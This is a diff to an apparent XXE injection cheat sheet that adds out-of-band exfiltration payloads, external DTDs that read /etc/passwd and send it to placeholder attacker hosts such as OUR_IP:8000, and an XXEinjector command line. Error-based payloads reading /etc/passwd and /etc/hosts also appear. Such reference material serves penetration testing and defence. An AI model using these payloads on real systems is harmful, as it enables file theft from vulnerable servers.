@@ -131,11 +131,12 @@
 * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burpcollaborator" > %xxe; ]>`&#x20;
 * Invoke `%xxe;` within the existing DTD if the above method does not work
 
-### Exfiltrate Data Out-of-Band <sub>(only if application allows to fetch contents remotely)</sub>
+### Out-of-band Data Exfiltration <sub>(only if application allows to fetch contents remotely)</sub>
 
 * Create a `malicious.dtd` external DTD file and host it in attacker controlled server to be fetched by victim server
 * Payload to be provided in vulnerable application
-  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`
+  * `<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://attacker_server.com/malicious.dtd"> %xxe; ]>`&#x20;
+  * `<!DOCTYPE email [ <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">     %remote; %oob; ]>`  <sup><sub>(Aternate Payload)<sub></sup> -> Reference the entity `<root>&content;</root>`
 
 <details>
 
@@ -143,12 +144,20 @@
 
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://www.attacker.com/?x=%file; '>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-IP/?x=%file; '>">
 %eval;
 %exfiltrate;
+<!-- Alternate Paylaod -->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://<IP>:8000/?content=%file;'>">
 ```
 
 </details>
+
+* **Automated OOB Exfiltration**
+  * [XXEinjector](https://github.com/enjoiz/XXEinjector)  - Supports most of the tricks including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
+  * We can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line <sup><sub>(ie<sub></sup> <sup><sub> </sup><sup><sub>`<?xml version="1.0" encoding="UTF-8"?>`<sub></sup><sup><sub>)<sub></sup>, and write `XXEINJECT` after it as a position locator for the tool.
+  * `ruby XXEinjector.rb --host=[attacker-IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter`
 
 ### Retrieve Data via Error Messages <sub>(only if application allows to fetch contents remotely)</sub>
 
@@ -170,7 +179,6 @@
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
-
 <!-- Alternate Payload -->
 <!ENTITY % file SYSTEM "file:///etc/hosts">
 <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
